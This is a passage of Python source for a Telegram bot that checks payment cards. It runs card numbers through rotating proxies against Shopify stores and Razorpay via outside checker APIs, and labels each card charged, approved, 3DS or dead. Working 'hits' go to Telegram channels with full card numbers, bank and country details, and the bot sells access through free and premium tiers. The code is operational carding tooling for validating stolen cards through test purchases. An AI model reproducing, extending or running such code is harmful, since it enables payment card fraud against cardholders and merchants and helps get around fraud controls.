        buttons=[[pbtn(bs("📩 Contact"), url=f"https://t.me/{OWNER_TAG.lstrip('@')}",
                       style="success", icon="📩")]])


async def send_group_only(event):
    return await styled_reply(event, pe(f"""💎 <b>{bs('Group only')}</b>
{SEP}
💎 {bs('Free users can only use in group')}
💎 <i>{bs('Upgrade for private access')}</i>"""))


# ====================== CLIENT ======================
client = TelegramClient('nova_bot', API_ID, API_HASH)
client_instance = client


# ====================== FREE-TIER TRACKER ======================
_FREE_USAGE = {}
_FREE_LAST  = {}


def _today():
    return datetime.now().strftime("%Y-%m-%d")


def get_free_usage(user_id: int) -> int:
    e = _FREE_USAGE.get(user_id)
    if not e or e.get("date") != _today():
        _FREE_USAGE[user_id] = {"date": _today(), "count": 0}
        return 0
    return e["count"]


def inc_free_usage(user_id: int):
    e = _FREE_USAGE.get(user_id)
    if not e or e.get("date") != _today():
        _FREE_USAGE[user_id] = {"date": _today(), "count": 1}
    else:
        e["count"] += 1


def free_cooldown_left(user_id: int) -> float:
    last = _FREE_LAST.get(user_id, 0)
    elapsed = time.time() - last
    if elapsed >= FREE_COOLDOWN_SEC:
        return 0.0
    return round(FREE_COOLDOWN_SEC - elapsed, 1)


def set_free_last(user_id: int):
    _FREE_LAST[user_id] = time.time()


# ====================== GLOBAL STATE ======================
ACTIVE_SESSIONS = {}
SHOPIFY_RESULTS = {}
RAZORPAY_RESULTS= {}
BOT_START_TIME  = time.time()


# ====================== VIDEO SYSTEM ======================
BASE_DIR  = os.path.dirname(os.path.abspath(__file__))
VIDEO_DIR = os.path.join(BASE_DIR, "videos")
os.makedirs(VIDEO_DIR, exist_ok=True)


def get_welcome_video():
    p = os.path.join(VIDEO_DIR, "welcome.mp4")
    return p if os.path.exists(p) else None


def get_hit_videos():
    try:
        return [os.path.join(VIDEO_DIR, f)
                for f in sorted(os.listdir(VIDEO_DIR))
                if f.startswith("hit") and f.endswith(".mp4")]
    except Exception:
        return []


def _pick_hit_video():
    vids = get_hit_videos()
    return random.choice(vids) if vids else None


# ====================== BIN LOOKUP ======================
async def get_bin_info(card_number: str):
    return await get_bin_info_cached(card_number, await get_bin_session())


# ====================== SHOPIFY API ======================
def _proxy_str_for_api(proxy: str):
    """Serialize proxy for API query param. Encodes user/pass so colons/@ don't break."""
    if not proxy:
        return None
    p = parse_proxy_format(proxy)
    if not p:
        return None
    try:
        port_int = int(p['port'])
        if not (0 < port_int <= 65535):
            return None
    except (ValueError, TypeError):
        return None
    if p['username'] and p['password']:
        u  = quote(p['username'], safe='')
        pw = quote(p['password'], safe='')
        return f"{p['ip']}:{p['port']}:{u}:{pw}"
    return f"{p['ip']}:{p['port']}"


def build_shopify_url(site: str, card: str, proxy: str = None) -> str:
    site_clean = re.sub(r'^https?://', '', site).rstrip('/')
    site_enc = quote(site_clean, safe='.-_')
    card_enc = quote(card, safe='')
    url = f"{SHOPIFY_API_URL}?url={site_enc}&card={card_enc}"
    ps = _proxy_str_for_api(proxy)
    if ps:
        url += f"&proxy={quote(ps, safe='')}"
    return url


def classify_shopify(raw: dict, card: str, site: str = None, proxy=None):
    response = str(raw.get('Response', raw.get('response', ''))).strip()
    resp_up = response.upper()
    resp_low = response.lower()
    status_code = str(raw.get('status_code', raw.get('status', ''))).upper()
    error_field = str(raw.get('error', raw.get('message', ''))).strip()
    price_raw = raw.get('Price', raw.get('price', '-'))
    try:
        price_val = float(str(price_raw).replace('$', '').replace(',', '').strip())
    except Exception:
        price_val = 0.0
    price_disp = f"${price_raw}" if price_raw not in ('-', '', 0, '0') else '-'
    gateway = raw.get('Gateway', raw.get('Gate', raw.get('gate', 'Shopify')))
    charged_flag = str(raw.get('Charged', raw.get('charged', ''))).lower()
    retryable = bool(raw.get('retryable', False))

    api_error_codes = {
        'PROXY_REQUIRED', 'PROXY_INVALID', 'PROXY_TIMEOUT', 'CARD_INVALID',
        'CARD_REQUIRED', 'CARD_EXPIRED', 'URL_INVALID', 'URL_REQUIRED',
    }
    if status_code in api_error_codes:
        return {'status': 'Error',
                'message': f"{status_code}: {error_field or response}",
                'card': card, 'site': site, 'gateway': gateway,
                'price': price_disp, 'price_value': price_val, 'proxy': proxy,
                'status_code': status_code, 'retryable': retryable}

    if resp_up == 'CHARGED' and charged_flag == 'true':
        return {'status': 'Charged', 'message': response or 'Charged',
                'card': card, 'site': site, 'gateway': gateway,
                'price': price_disp, 'price_value': price_val, 'proxy': proxy,
                'status_code': status_code or 'ORDER_PLACED', 'retryable': False}

    approved_codes = {
        'INSUFFICIENT_FUNDS', 'PAYMENT_PROCESSING', 'ORDER_NOT_CONFIRMED',
        'APPROVED_PAYMENT_PROCESSING', 'INSUFFICIENT ACCOUNT BALANCE',
    }
    if resp_up == 'APPROVED' or status_code in approved_codes:
        return {'status': 'Approved', 'message': response or status_code,
                'card': card, 'site': site, 'gateway': gateway,
                'price': price_disp, 'price_value': price_val, 'proxy': proxy,
                'status_code': status_code or 'APPROVED', 'retryable': False}

    threeds_codes = {'3DS_AUTHENTICATION', '3DS_REQUIRED', 'OTP_REQUIRED'}
    if resp_up == '3DS' or status_code in threeds_codes or '3ds' in resp_low:
        return {'status': '3DS', 'message': response or status_code or '3DS',
                'card': card, 'site': site, 'gateway': gateway,
                'price': price_disp, 'price_value': price_val, 'proxy': proxy,
                'status_code': status_code or '3DS_AUTHENTICATION', 'retryable': False}

    declined_codes = {
        'CARD_DECLINED', 'DO_NOT_HONOR', 'CVV_INVALID', 'CARD_STOLEN',
        'RISK_REJECTED', 'DELIVERY_DETAILS_CHANGED', 'CAPTCHA_REQUIRED',
        'DECLINED', 'SITE_NOT_SUPPORTED',
    }
    if resp_up == 'DECLINED' or status_code in declined_codes:
        return {'status': 'Dead', 'message': response or status_code or 'Declined',
                'card': card, 'site': site, 'gateway': gateway,
                'price': price_disp, 'price_value': price_val, 'proxy': proxy,
                'status_code': status_code or 'CARD_DECLINED', 'retryable': retryable}

    error_codes = {
        'OUT_OF_STOCK', 'RATE_LIMITED', 'GENERIC_ERROR', 'TIMEOUT',
        'EXCEPTION', 'SUBMIT_REJECTED',
    }
    if resp_up in ('ERROR', 'SITE ERROR') or status_code in error_codes or not response:
        msg = error_field or response or status_code or 'API error'
        return {'status': 'Error', 'message': msg,
                'card': card, 'site': site, 'gateway': gateway,
                'price': price_disp, 'price_value': price_val, 'proxy': proxy,
                'status_code': status_code, 'retryable': retryable or True}

    if is_site_error(response):
        return {'status': 'Error', 'message': response[:80],
                'card': card, 'site': site, 'gateway': gateway,
                'price': price_disp, 'price_value': price_val, 'proxy': proxy,
                'status_code': 'SITE_ERROR', 'retryable': True}

    charged_keys = ['charged', 'order_paid', 'order_placed', 'order_confirmed',
                    'thank you', 'payment successful', 'order_completed',
                    'order_created', 'order confirmed', 'transaction success']
    if any(k in resp_low for k in charged_keys):
        return {'status': 'Charged', 'message': response,
                'card': card, 'site': site, 'gateway': gateway,
                'price': price_disp, 'price_value': price_val, 'proxy': proxy,
                'status_code': status_code or 'ORDER_PLACED', 'retryable': False}

    threeds_keys = ['3d', '3d secure', 'otp', 'verification required',
                    'authenticate', 'authentication required']
    if any(k in resp_low for k in threeds_keys):
        return {'status': '3DS', 'message': response,
                'card': card, 'site': site, 'gateway': gateway,
                'price': price_disp, 'price_value': price_val, 'proxy': proxy,
                'status_code': status_code or '3DS_AUTHENTICATION', 'retryable': False}

    approved_keys = ['approved', 'success', 'insufficient_funds', 'insufficient funds',
                     'invalid_cvv', 'incorrect_cvv', 'invalid cvc', 'incorrect cvc']
    if any(k in resp_low for k in approved_keys):
        return {'status': 'Approved', 'message': response,
                'card': card, 'site': site, 'gateway': gateway,
                'price': price_disp, 'price_value': price_val, 'proxy': proxy,
                'status_code': status_code or 'APPROVED', 'retryable': False}

    return {'status': 'Dead', 'message': response or 'Declined',
            'card': card, 'site': site, 'gateway': gateway,
            'price': price_disp, 'price_value': price_val, 'proxy': proxy,
            'status_code': status_code or 'CARD_DECLINED', 'retryable': retryable}


async def check_card_shopify(card: str, site: str, proxy: str = None, http_session=None):
    parts = card.split('|')
    if len(parts) != 4:
        return {'status': 'Dead', 'message': 'Invalid format', 'card': card,
                'site': site, 'gateway': 'Shopify', 'price': '-',
                'price_value': 0.0, 'proxy': proxy, 'retryable': False}, None
    url = build_shopify_url(site, card, proxy)
    session = http_session or (await get_http_session())
    try:
        async with session.get(url) as resp:
            if resp.status == 429:
                return {'status': 'Error', 'message': 'API rate limited (429)',
                        'card': card, 'site': site, 'gateway': 'Shopify',
                        'price': '-', 'price_value': 0.0, 'proxy': proxy,
                        'retryable': True}, proxy
            if resp.status in (500, 502, 503, 504):
                return {'status': 'Error', 'message': f"API {resp.status}",
                        'card': card, 'site': site, 'gateway': 'Shopify',
                        'price': '-', 'price_value': 0.0, 'proxy': proxy,
                        'retryable': True}, proxy
            if resp.status != 200:
                return {'status': 'Dead', 'message': f"HTTP {resp.status}", 'card': card,
                        'site': site, 'gateway': 'Shopify', 'price': '-',
                        'price_value': 0.0, 'proxy': proxy, 'retryable': False}, proxy
            try:
                raw = await resp.json(content_type=None)
            except Exception:
                return {'status': 'Error', 'message': 'Invalid JSON from API',
                        'card': card, 'site': site, 'gateway': 'Shopify',
                        'price': '-', 'price_value': 0.0, 'proxy': proxy,
                        'retryable': True}, proxy
        return classify_shopify(raw, card, site, proxy), proxy
    except asyncio.TimeoutError:
        return {'status': 'Error', 'message': 'Timeout', 'card': card,
                'site': site, 'gateway': 'Shopify', 'price': '-',
                'price_value': 0.0, 'proxy': proxy, 'retryable': True}, proxy
    except asyncio.CancelledError:
        raise
    except Exception as e:
        return {'status': 'Error', 'message': str(e)[:100], 'card': card,
                'site': site, 'gateway': 'Shopify', 'price': '-',
                'price_value': 0.0, 'proxy': proxy, 'retryable': True}, proxy


async def check_card_with_retry(card: str, sites: list, proxies: list,
                                max_retries: int = 2, rotator=None, http_session=None):
    if not sites:
        return {'status': 'Error', 'message': 'No sites', 'card': card,
                'gateway': 'Unknown', 'price': '-', 'price_value': 0.0,
                'retryable': False}, None
    if not proxies:
        return {'status': 'Error', 'message': 'No proxies', 'card': card,
                'gateway': 'Unknown', 'price': '-', 'price_value': 0.0,
                'retryable': False}, None

    rotator = rotator or SmartRotator()
    tried_sites, tried_proxies = set(), set()
    last_result, last_proxy = None, None

    for attempt in range(max_retries):
        site = rotator.pick_site(sites, exclude=tried_sites)
        if not site:
            break
        tried_sites.add(site)

        proxy = rotator.pick_proxy(proxies, exclude=tried_proxies)
        if proxy:
            tried_proxies.add(proxy)
        last_proxy = proxy

        result, used_proxy = await check_card_shopify(card, site, proxy, http_session)
        last_proxy = used_proxy or last_proxy
        last_result = result

        status = result.get('status', 'Dead')
        msg = result.get('message', '')
        api_retryable = result.get('retryable', False)

        # Stop conditions: hit / dead-with-no-retry
        if status in ('Charged', 'Approved', '3DS'):
            rotator.report_site_ok(site)
            if proxy:
                rotator.report_proxy_ok(proxy)
            return result, last_proxy
        if status == 'Dead' and not api_retryable:
            rotator.report_site_ok(site)
            if proxy:
                rotator.report_proxy_ok(proxy)
            return result, last_proxy

        # Retry path
        rotator.report_site_fail(site)
        if proxy and is_proxy_error(msg):
            rotator.report_proxy_fail(proxy)
        await asyncio.sleep(0)

    if last_result:
        return last_result, last_proxy
    return {'status': 'Error', 'message': 'All attempts failed', 'card': card,
            'gateway': 'Unknown', 'price': '-', 'price_value': 0.0,
            'retryable': True}, last_proxy


# ====================== RAZORPAY ======================
def build_rz_url(card: str, proxy: str = None) -> str:
    url = f"{RAZORPAY_API_URL}?cc={quote(card, safe='')}"
    ps = _proxy_str_for_api(proxy)
    if ps:
        url += f"&proxy={quote(ps, safe='')}"
    return url


def classify_rz(raw: dict, card: str, proxy=None):
    raw_resp = str(raw.get('response', raw.get('Response', '')))
    resp = rz_clean_response(raw_resp)
    resp_low = resp.lower()
    gateway = 'RazorPay'

    if is_rz_retry_error(resp):
        return {'status': 'RetryError', 'Response': resp, 'Price': '-',
                'Gateway': gateway, 'card': card, 'proxy': proxy}

    charged_keys = ['transaction success', 'payment successful', 'payment success',
                    'order_paid', 'charged', 'captured']
    if any(k in resp_low for k in charged_keys):
        return {'status': 'Charged', 'Response': resp, 'Price': '-',
                'Gateway': gateway, 'card': card, 'proxy': proxy}

    approved_keys = ['insufficient account balance', 'insufficient_funds',
                     'insufficient funds', 'otp_required', 'otp required',
                     '3d_authentication', '3ds_required', 'authentication_required',
                     'cvc', 'ccn']
    if any(k in resp_low for k in approved_keys):
        return {'status': 'Approved', 'Response': resp, 'Price': '-',
                'Gateway': gateway, 'card': card, 'proxy': proxy}

    threeds_keys = ['3d', '3d secure', 'otp', 'verification required']
    if any(k in resp_low for k in threeds_keys):
        return {'status': '3DS', 'Response': resp, 'Price': '-',
                'Gateway': gateway, 'card': card, 'proxy': proxy}

    declined_keys = ['payment cancelled', 'cancelled', 'card_declined', 'card declined',
                     'generic_decline', 'generic decline', 'do_not_honor', 'do not honor',
                     'stolen_card', 'lost_card', 'expired_card', 'expired card',
                     'restricted_card', 'fraudulent', 'not_permitted',
                     'transaction_not_allowed', 'card_not_supported', 'decline',
                     'your card was declined', 'payment failed', 'failed', 'generic_error']
    if any(k in resp_low for k in declined_keys):
        return {'status': 'Dead', 'Response': resp, 'Price': '-',
                'Gateway': gateway, 'card': card, 'proxy': proxy}

    return {'status': 'Dead', 'Response': resp or 'Unknown', 'Price': '-',
            'Gateway': gateway, 'card': card, 'proxy': proxy}


async def check_rz_card(card: str, proxy: str = None, http_session=None):
    url = build_rz_url(card, proxy)
    session = http_session or (await get_http_session())
    try:
        async with session.get(url) as resp:
            if resp.status != 200:
                return {'status': 'RetryError', 'Response': f"HTTP {resp.status}",
                        'Price': '-', 'Gateway': 'RazorPay', 'card': card,
                        'proxy': proxy}, proxy
            try:
                raw = await resp.json(content_type=None)
            except Exception:
                return {'status': 'RetryError', 'Response': 'Invalid JSON',
                        'Price': '-', 'Gateway': 'RazorPay', 'card': card,
                        'proxy': proxy}, proxy
        return classify_rz(raw, card, proxy), proxy
    except asyncio.TimeoutError:
        return {'status': 'RetryError', 'Response': 'Timeout', 'Price': '-',
                'Gateway': 'RazorPay', 'card': card, 'proxy': proxy}, proxy
    except asyncio.CancelledError:
        raise
    except Exception as e:
        return {'status': 'RetryError', 'Response': str(e)[:100], 'Price': '-',
                'Gateway': 'RazorPay', 'card': card, 'proxy': proxy}, proxy


async def check_rz_with_retry(card: str, proxies: list, max_retries: int = 2,
                              rotator=None, http_session=None):
    if not proxies:
        return {'status': 'RetryError', 'Response': 'No proxies', 'Price': '-',
                'Gateway': 'RazorPay', 'card': card}, None

    rotator = rotator or SmartRotator()
    tried_proxies = set()
    last, last_proxy = None, None

    for attempt in range(max_retries):
        proxy = rotator.pick_proxy(proxies, exclude=tried_proxies)
        if proxy:
            tried_proxies.add(proxy)

        result, used_proxy = await check_rz_card(card, proxy, http_session)
        last_proxy = used_proxy or last_proxy
        last = result

        if result.get('status') != 'RetryError':
            if proxy:
                rotator.report_proxy_ok(proxy)
            return result, last_proxy

        if proxy:
            rotator.report_proxy_fail(proxy)
        if attempt < max_retries - 1:
            await asyncio.sleep(0)

    if last:
        last['status'] = 'Dead'
        return last, last_proxy
    return {'status': 'Dead', 'Response': 'Max retries', 'Price': '-',
            'Gateway': 'RazorPay', 'card': card}, last_proxy


# ====================== PROXY TEST ======================
async def test_proxy(proxy: str):
    proxy_url = proxy_to_url(proxy)
    test_urls = [
        "https://gunfighteruniversity.myshopify.com/products.json",
        "https://cdn.shopify.com/",
    ]
    session = await get_proxy_session()

    for url in test_urls:
        try:
            async with session.get(
                url, proxy=proxy_url,
                timeout=aiohttp.ClientTimeout(total=25, connect=15),
                allow_redirects=True,
            ) as r:
                if r.status in (200, 401, 403, 404):
                    ip = '?'
                    try:
                        async with session.get(
                            'https://api.ipify.org?format=json',
                            proxy=proxy_url,
                            timeout=aiohttp.ClientTimeout(total=10)) as ir:
                            if ir.status == 200:
                                data = await ir.json(content_type=None)
                                ip = data.get('ip', '?')
                    except Exception:
                        pass
                    return {'proxy': proxy, 'status': 'alive', 'ip': ip}
                if r.status == 407:
                    log_system("PROXY_TEST", f"{proxy[:50]} -> 407 auth required", "warning")
                    return {'proxy': proxy, 'status': 'dead',
                            'reason': 'proxy auth required (407)'}
        except Exception as e:
            log_system("PROXY_TEST", f"{proxy[:50]} -> {type(e).__name__}: {e}", "warning")

    return {'proxy': proxy, 'status': 'dead', 'reason': 'no Shopify reachability'}


# ====================== CARD FORMATTING ======================
def _bin_lines(bin_tuple):
    brand, typ, level, bank, country, flag = bin_tuple
    return (
        f"{bs('BIN')} ━ <code>{brand} - {typ} - {level}</code>\n"
        f"{bs('Bank')} ━ <code>{bank}</code>\n"
        f"{bs('Country')} ━ <code>{country} {flag}</code>"
    )


def _status_header(status: str):
    s = (status or '').upper()
    if s == 'CHARGED':  return f"🥇 <b>{bs('CHARGED')}</b>"
    if s == 'APPROVED': return f"🥈 <b>{bs('APPROVED')}</b>"
    if s == '3DS':      return f"🥉 <b>{bs('3DS')}</b>"
    if s == 'DECLINED': return f"🥔 <b>{bs('DECLINED')}</b>"
    if s == 'ERROR':    return f"🧨 <b>{bs('ERROR')}</b>"
    return f"⚪ <b>{bs(s or 'UNKNOWN')}</b>"


def format_shopify_single(result: dict, bin_tuple, elapsed: float) -> str:
    card = result.get('card', '-')
    gateway = result.get('gateway', 'Shopify')
    response = (result.get('message') or '')[:150]
    price = result.get('price', '-')
    status = result.get('status', 'Dead').upper()
    if status == 'DEAD':
        status = 'DECLINED'
    return pe(f"""{_status_header(status)}
{SEP}
⊀ {bs('Card')}
⤷ <code>{card}</code>
{bs('Gateway')} ━ <code>{gateway}</code>
{bs('Response')} ━ <code>{response}</code>
{bs('Price')} ━ <code>{price}</code>
{SEP}
{_bin_lines(bin_tuple)}
{SEP}
{bs('Took')} ⏱ <code>{elapsed:.2f}s</code>""")


def format_rz_single(result: dict, bin_tuple, elapsed: float) -> str:
    card = result.get('card', '-')
    gateway = result.get('Gateway', 'RazorPay')
    response = (result.get('Response') or '')[:150]
    status = result.get('status', 'Dead').upper()
    if status == 'DEAD':
        status = 'DECLINED'
    return pe(f"""{_status_header(status)}
{SEP}
⊀ {bs('Card')}
⤷ <code>{card}</code>
{bs('Gateway')} ━ <code>{gateway}</code>
{bs('Response')} ━ <code>{response}</code>
{SEP}
{_bin_lines(bin_tuple)}
{SEP}
{bs('Took')} ⏱ <code>{elapsed:.2f}s</code>""")


def format_realtime_hit(result: dict, gateway_type: str, bin_tuple) -> str:
    if gateway_type == "RazorPay":
        card = result.get('card', '-')
        gateway = result.get('Gateway', 'RazorPay')
        response = (result.get('Response') or '')[:150]
        status = result.get('status', 'Dead').upper()
        if status == 'DEAD':
            status = 'DECLINED'
        return pe(f"""{_status_header(status)}

💳 CC <code>{card}</code>

🛒 {bs('Gateway')} {gateway}
📝 {bs('Response')} {response}

🆔 {bs('BIN Info')} {bin_tuple[0]} - {bin_tuple[1]} - {bin_tuple[2]}
🏦 {bs('Bank')} {bin_tuple[3]}
🥰 {bs('Country')} {bin_tuple[4]} {bin_tuple[5]}""")

    card = result.get('card', '-')
    gateway = result.get('gateway', 'Shopify')
    response = (result.get('message') or '')[:150]
    price = result.get('price', '-')
    status = result.get('status', 'Dead').upper()
    if status == 'DEAD':
        status = 'DECLINED'
    return pe(f"""{_status_header(status)}

💳 CC <code>{card}</code>

🛒 {bs('Gateway')} {gateway}
📝 {bs('Response')} {response}
💸 {bs('Price')} {price}

🆔 {bs('BIN Info')} {bin_tuple[0]} - {bin_tuple[1]} - {bin_tuple[2]}
🏦 {bs('Bank')} {bin_tuple[3]}
🥰 {bs('Country')} {bin_tuple[4]} {bin_tuple[5]}""")


# ====================== HIT CHANNELS ======================
HIT_BUTTON = [[pbtn(bs("💎 NOVA"), url="http://t.me/spectrumxchkbot",
                    style="primary", icon="💎")]]


async def send_realtime_hit(user_id: int, result: dict, hit_type: str,
                            user_name: str, gateway_type: str = "Shopify",
                            video_path: str = None):
    bin_tuple = await get_bin_info(result.get('card', '').split('|')[0])
    text = format_realtime_hit(result, gateway_type, bin_tuple)
    video_path = video_path or _pick_hit_video()
    try:
        if video_path and os.path.exists(video_path):
            await send_file_entities(user_id, video_path, text,
                                     buttons=HIT_BUTTON, supports_streaming=True)
        else:
            await send_entities(user_id, text, buttons=HIT_BUTTON)
    except Exception as e:
        log_system("HIT_DM", f"user {user_id}: {e}", "error")


async def send_hit_to_channel(card: str, status: str, response: str,
                              gateway: str, price: str = "-",
                              user_mention: str = None, user_id: int = None,
                              gateway_type: str = "Shopify",
                              site: str = None, proxy_used: str = None,
                              video_path: str = None):
    status_up = (status or '').upper()
    if status_up not in ("CHARGED", "APPROVED", "3DS"):
        return

    mention = user_mention or "User"
    video_path = video_path or _pick_hit_video()

    if HIT_CHANNEL_ID and HIT_CHANNEL_ID != -1000000000000:
        try:
            body = pe(f"""⭐ <b>{bs('HIT')}</b> ➛ <b>{bs(status_up)}</b>
{SEP}
⊀ {bs('Gateway')} ━ <code>{gateway}</code>
{bs('Response')} ━ <code>{(response or '')[:45]}</code>
{bs('Price')} ━ <code>{price}</code>
{SEP}
{bs('User')} ➛ {mention}
{SEP}
{DEV_LINE}""")

            sent = None
            if video_path and os.path.exists(video_path):
                try:
                    sent = await send_file_entities(
                        abs(HIT_CHANNEL_ID), video_path, body,
                        buttons=HIT_BUTTON, supports_streaming=True)
                except Exception as e:
                    log_system("HIT_MAIN", f"video failed: {e}", "error")
            if sent is None:
                sent = await send_entities(abs(HIT_CHANNEL_ID), body, buttons=HIT_BUTTON)
            if status_up == "CHARGED" and sent:
                try:
                    await client_instance.pin_message(abs(HIT_CHANNEL_ID), sent.id)
                except Exception:
                    pass
        except Exception as e:
            log_system("HIT_MAIN", f"failed: {e}", "error")

    if CHARGED_ONLY_CHANNEL_ID and CHARGED_ONLY_CHANNEL_ID != -1000000000000:
        try:
            bin_tuple = await get_bin_info(card.split('|')[0])
            brand, typ, level, bank, country, flag = bin_tuple
            bin_disp = f"{brand} - {typ} - {level}" if brand != '-' else "N/A"
            bank_disp = bank if bank != '-' else "N/A"
            country_disp = f"{country} {flag}" if country != '-' else "N/A"
            site_disp = site or "N/A"
            uid_disp = f"<code>{user_id}</code>" if user_id else "N/A"
            proxy_line = f"\n{bs('Proxy')} ━ <code>{proxy_used}</code>" if proxy_used else ""
            date_full = datetime.now().strftime('%d-%m-%Y %H:%M:%S')
            status_label = f"{PE} {bs(status_up)}"

            body = pe(f"""{status_label}
{SEP}
⊀ {bs('Card')}
⤷ <code>{card}</code>
{bs('Gateway')} ━ <code>{gateway}</code>
{bs('Site')} ━ <code>{site_disp}</code>
{bs('Response')} ━ <code>{response}</code>
{bs('Price')} ━ <code>{price}</code>{proxy_line}
{SEP}
{bs('BIN')} ━ <code>{bin_disp}</code>
{bs('Bank')} ━ <code>{bank_disp}</code>
{bs('Country')} ━ <code>{country_disp}</code>
{SEP}
{bs('User')} ➛ {mention} ({uid_disp})
{bs('Date')} ➛ {date_full}
{SEP}
{DEV_LINE}""")

            sent = None
            if video_path and os.path.exists(video_path):
                try:
                    sent = await send_file_entities(
                        abs(CHARGED_ONLY_CHANNEL_ID), video_path, body,
                        buttons=HIT_BUTTON, supports_streaming=True)
                except Exception as e:
                    log_system("HIT_FULL", f"video failed: {e}", "error")
            if sent is None:
                sent = await send_entities(abs(CHARGED_ONLY_CHANNEL_ID), body, buttons=HIT_BUTTON)
            if status_up == "CHARGED" and sent:
                try:
                    await client_instance.pin_message(abs(CHARGED_ONLY_CHANNEL_ID), sent.id)
                except Exception:
                    pass
        except Exception as e:
            log_system("HIT_FULL", f"failed: {e}", "error")


# ====================== REDEEM LOG ======================
async def send_redeem_log(user_id: int, key: str, status: str, details: str = ""):
    if not REDEEM_LOG_CHANNEL_ID or REDEEM_LOG_CHANNEL_ID == -1000000000000:
        return
    try:
        sender = await client_instance.get_entity(user_id)
        username = f"@{sender.username}" if sender.username else f"User {user_id}"
    except Exception:
        username = f"User {user_id}"

    keys_data = load_keys()
    entry = keys_data.get(key, {})
    hours = entry.get("hours", DEFAULT_KEY_HOURS)
    try:
        hours = int(hours)
    except Exception:
        hours = DEFAULT_KEY_HOURS

    if hours < 24:
        plan_disp = f"{hours}.0h"
        exp_mins = hours * 60 - 1
        exp_h, exp_m = exp_mins // 60, exp_mins % 60
        exp_disp = f"{exp_h}h {exp_m:02d}m"
    else:
        days = hours // 24
        plan_disp = f"{days}.0d"
        exp_disp = f"{days - 1}d 23h 59m"

    ok = status.startswith("✅")
    emoji = "✅" if ok else "❌"
    body = pe(f"""{emoji} <b>{bs('Redeem Log')}</b> ➛ <b>{bs(status)}</b>
{SEP}
👤 <b>{bs('User')}</b> ⌁ {username} ⌁ <code>{user_id}</code>
🔑 <b>{bs('Key')}</b> ⌁ <code>{key}</code>
💎 <b>{bs('Plan')}</b> ⌁ <code>{plan_disp}</code>
⏰ <b>{bs('Expires')}</b> ⌁ <code>{exp_disp}</code>
📝 <b>{bs('Details')}</b> ⌁ <i>{details or '-'}</i>
{SEP}
{DEV_LINE}""")

    try:
        await send_entities(abs(REDEEM_LOG_CHANNEL_ID), body, buttons=HIT_BUTTON)
    except Exception as e:
        log_system("REDEEM_LOG", f"send failed: {e}", "error")


# ====================== FREE GATE ======================
async def _check_free_or_premium(event, uid: int) -> bool:
    if uid in ADMIN_ID:
        return True
    if is_premium(uid):
        return True
    is_group = event.chat_id != uid
    if not is_group:
        await send_group_only(event)
        return False
    used = get_free_usage(uid)
    if used >= FREE_DAILY_LIMIT:
        await styled_reply(event, pe(f"""💎 <b>{bs('Daily limit')}</b>
{SEP}
💎 {bs('Used')}: <code>{used}/{FREE_DAILY_LIMIT}</code>
💎 <i>{bs('Redeem a key or contact admin')}</i>"""),
            buttons=[[pbtn(bs("📩 Contact"), url=f"https://t.me/{OWNER_TAG.lstrip('@')}",
                           style="success", icon="📩")]])
        return False
    left = free_cooldown_left(uid)
    if left > 0:
        await styled_reply(event, pe(f"⚠️ <b>{bs('Wait')} {left}s</b>"))
        return False
    return True


def _consume_free(uid: int):
    if uid in ADMIN_ID or is_premium(uid):
        return
    set_free_last(uid)
    inc_free_usage(uid)


# ====================== SINGLE: /sh ======================
@client.on(events.NewMessage(pattern=r'^[/.](sh|sp)\s+'))
async def cmd_sh(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if not await _check_free_or_premium(event, uid):
        return
    if uid not in ADMIN_ID and is_premium(uid):
        ulimit = get_premium_daily_limit(uid)
        if ulimit > 0:
            used = get_premium_daily_used(uid)
            if used >= ulimit:
                return await styled_reply(event, pe(
                    f"⚠️ <b>{bs('Daily limit reached')}</b>\n{SEP}\n"
                    f"Used: <code>{used}/{ulimit}</code>"
                ))
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>/sh card|mm|yy|cvv</code>"))
    cards = extract_cc(parts[1])
    if not cards:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid card')}</b>"))
    card = cards[0]
    sites = load_sites()
    if not sites:
        return await styled_reply(event, pe(f"💎 <b>{bs('No sites')}</b>"))
    proxies = load_user_proxies(uid)
    if not proxies:
        return await styled_reply(event, pe(f"💎 <b>{bs('No proxies')}</b> — /addproxy"))
    try:
        sender = await event.get_sender()
        username = sender.username or f"user_{uid}"
        name = sender.first_name or username
    except Exception:
        username, name = f"user_{uid}", "User"

    status_msg = await styled_reply(event, pe(f"💎 {bs('Checking')} <code>{card}</code>..."))
    st = time.time()
    rotator = SmartRotator()
    http_session = await get_user_http_session(uid, "sp")
    sem = get_user_sem(uid, "sp")
    try:
        async with sem:
            result, proxy_used = await check_card_with_retry(
                card, sites, proxies, max_retries=2,
                rotator=rotator, http_session=http_session)
        elapsed = time.time() - st
        bin_tuple = await get_bin_info(card.split('|')[0])
        text = format_shopify_single(result, bin_tuple, elapsed)
        status = result.get('status', 'Dead')
        _consume_free(uid)
        if uid not in ADMIN_ID and is_premium(uid):
            inc_premium_daily_used(uid)
        if status in ("Charged", "Approved", "3DS"):
            if status == "Charged":
                increment_charge_count(uid)
            video_path = _pick_hit_video()
            try:
                await status_msg.delete()
            except Exception:
                pass
            await styled_reply(event, text, buttons=HIT_BUTTON)
            asyncio.create_task(send_realtime_hit(uid, result, status, name, "Shopify", video_path=video_path))
            asyncio.create_task(send_hit_to_channel(
                card, status, result.get('message', ''), result.get('gateway', 'Shopify'),
                result.get('price', '-'), user_mention=f"@{username}" if username else name,
                user_id=uid, gateway_type="Shopify",
                site=result.get('site'), proxy_used=proxy_used,
                video_path=video_path))
        else:
            await edit_entities(status_msg, text, buttons=HIT_BUTTON)
    except Exception as e:
        try:
            await status_msg.edit(pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"), parse_mode='html')
        except Exception:
            pass
    finally:
        await cleanup_user_http_session(uid, "sp")


# ====================== SINGLE: /rz ======================
@client.on(events.NewMessage(pattern=r'^[/.]rz\s+'))
async def cmd_rz(event):
    if not RAZORPAY_ENABLED:
        return await styled_reply(event, pe(
            f"💎 <b>{bs('Razorpay')}</b>\n{SEP}\n"
            f"💎 <i>{bs('Temporarily unavailable')}</i>\n"
            f"💎 {bs('Use')} <code>/sh</code> {bs('instead')}"))
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if not await _check_free_or_premium(event, uid):
        return
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>/rz card|mm|yy|cvv</code>"))
    cards = extract_cc(parts[1])
    if not cards:
